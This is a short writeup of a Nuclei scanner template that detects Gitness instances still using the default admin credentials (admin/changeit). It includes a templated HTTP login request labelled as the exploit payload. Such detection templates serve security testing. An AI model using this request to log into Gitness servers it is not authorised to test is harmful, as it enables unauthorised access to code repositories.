# Nuclei Template: Gitness - Default Login
**Template ID:** gitness-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`gitness-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Detected Gitness instance was found using default admin credentials (admin/changeit).

## Steps to reproduce / Exploit Payload
```http
POST /api/v1/login?include_cookie=true HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"login_identifier":"{{username}}","password":"{{password}}"}
```

## References
- https://docs.gitness.com/
